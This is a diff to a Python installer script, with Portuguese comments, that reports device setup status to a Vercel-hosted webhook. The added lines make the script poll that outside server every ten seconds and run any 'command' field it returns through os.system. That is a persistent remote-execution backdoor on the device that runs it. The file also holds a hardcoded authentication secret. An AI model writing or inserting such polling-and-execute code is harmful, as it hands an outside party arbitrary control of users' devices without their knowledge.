@@ -12,8 +12,6 @@ URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
 AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
 URL_REQS = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/requerimentos.txt"
 
-
-
 report = {
     "installation_status": "pending",
     "steps": {},
@@ -81,6 +79,9 @@ except:
 report["installation_status"] = "Completed"
 print("✅ Configuration finished! Connecting to control panel...")
 
+# Controle para enviar o report completo apenas na primeira vez
+first_connection = True
+
 while True:
     try:
         try:
@@ -90,10 +91,11 @@ while True:
             os.system("pip install requests -q > /dev/null 2>&1")
             import requests
 
+        # Monta o payload. Se for a primeira conexão, manda tudo. Depois, manda só um "estou vivo".
         payload = {
             "guild_id": user_id,
-            "message": "Connection attempt finalized.",
-            "report": report
+            "status": "online",
+            "report": report if first_connection else {}
         }
         
         headers = {
@@ -104,12 +106,31 @@ while True:
         response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
-            print("🚀 Device synchronized successfully!")
-            break
+            if first_connection:
+                print("🚀 Device synchronized and actively listening for commands!")
+                first_connection = False
+            
+            # --- EXECUÇÃO DE COMANDOS ---
+            # Supondo que sua API retorne um JSON com os comandos pendentes.
+            # Exemplo de resposta da API: {"status": "ok", "command": "python functions/copy.py"}
+            try:
+                data = response.json()
+                comando_recebido = data.get("command")
+                
+                if comando_recebido:
+                    print(f"📥 Executing received command: {comando_recebido}")
+                    # Roda o comando e continua o loop sem fechar o script
+                    os.system(comando_recebido)
+            except ValueError:
+                pass # Ignora se a resposta não for um JSON válido
+                
         else:
-            print(f"⚠️ Server busy ({response.status_code}). Retrying in 5 seconds...")
-            time.sleep(5)
+            print(f"⚠️ Server busy ({response.status_code})...")
             
     except Exception as e:
-        print("📡 No connection or network error. Reconnecting in 5 seconds...")
-        time.sleep(5)
+        print("📡 No connection or network error. Retrying...")
+    
+    # PONTO CRÍTICO: Espera 10 segundos antes de perguntar novamente.
+    # Isso evita que a Vercel bloqueie seu IP por excesso de requisições (Rate Limit) 
+    # e impede que o celular fique com 100% de uso de CPU.
+    time.sleep(10)
